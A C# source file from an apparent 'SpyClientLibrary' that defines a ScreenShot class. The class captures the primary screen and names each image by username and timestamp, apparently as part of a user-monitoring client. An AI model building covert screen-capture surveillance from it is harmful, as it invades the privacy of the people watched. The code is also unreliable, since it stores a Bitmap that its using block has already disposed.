using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;

namespace SpyClientLibrary
{
    public class ScreenShot
    {
        public Bitmap _currentScreen { get; set; }
        public DateTime _scrrenData { get; set; }
        public User _user { get; set; }
        public string _screenName { get; set; }

        public ScreenShot(User user)
        {
            _user=user;
        }

        public ScreenShot GenerateCurrentScreen()
        {
            _scrrenData = DateTime.Now;

            using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                {
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                     Screen.PrimaryScreen.Bounds.Y,
                                     0, 0,
                                     bmpScreenCapture.Size,
                                     CopyPixelOperation.SourceCopy);
                }
                _currentScreen = bmpScreenCapture;    
            }            
            CreateScreenName();
            return this;
        }

        private string CreateScreenName()
        {
            //FORMAT : username_YYYY_M_D_h_m.bmp
            _screenName = _user._userName + "_" + 
                          _scrrenData.Year.ToString() + "_" +
                          _scrrenData.Month.ToString() +"_" +
                          _scrrenData.Day.ToString() + "_" +
                          _scrrenData.Hour.ToString() + "_" +
                          _scrrenData.Minute.ToString() + ".bmp";
            return _screenName;
        }
        
    }
}
